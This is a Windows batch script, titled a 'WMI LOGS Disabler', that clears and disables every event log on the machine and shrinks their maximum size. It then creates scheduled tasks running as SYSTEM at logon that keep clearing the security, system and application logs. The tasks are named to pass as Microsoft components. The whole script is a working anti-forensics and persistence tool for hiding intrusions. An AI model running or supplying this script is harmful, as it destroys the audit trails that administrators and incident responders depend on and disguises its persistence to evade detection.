@echo off
TITLE ::: WMI LOGS Disabler ::: 
color 1C
echo ############################################################
echo Self-disable WMI Event Logs ::: 
echo Get Ready for 2 sec ...
echo ############################################################
ping -n 1 127.0.0.1 > nul
cls
echo ############################################################
echo Self-disable WMI Event Logs ::: 
echo Get Ready for 1 sec ...
echo ############################################################
ping -n 1 127.0.0.1 > nul
cls
echo ############################################################
echo Self-disable WMI Event Logs ::: 
echo Get Ready for 0 sec ...
echo ############################################################
ping -n 1 127.0.0.1 > nul
cls
echo.
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_halt "%%G")
echo.
pause
cls
echo Event Logs have been halted! Processing..
ping -n 1 127.0.0.1 > nul
cls
echo Event Logs have been halted! Processing....
ping -n 1 127.0.0.1 > nul
goto theEnd
:do_halt
echo cleaning %1
wevtutil.exe cl %1
echo halting %1
wevtutil.exe sl %1 /e:false
echo minimizing %1
wevtutil.exe sl %1 /ms:64
goto :eof
:noAdmin
echo You must run this script as an Administrator!
echo ^<press any key^>
:theEnd
cls
echo ###################################################################
echo Okay, seems legit {x_X}
echo If you need auto-clean system, security and application journals 
echo On start please enter 'any button' or [X] to exit
echo ###################################################################
pause>NUL
schtasks /create /sc ONLOGON /tn "Microsoft CSecurity Provider" /tr "wevtutil.exe cl security" /ru "System"
schtasks /create /sc ONLOGON /tn "Microsoft CSystem Provider" /tr "wevtutil.exe cl system" /ru "System"
schtasks /create /sc ONLOGON /tn "Microsoft CApplication Provider" /tr "wevtutil.exe cl application" /ru "System"
cls
echo ############################################################
echo Fine, all work done! :::
echo. 
echo ############################################################
ping -n 2 127.0.0.1 > nul
exit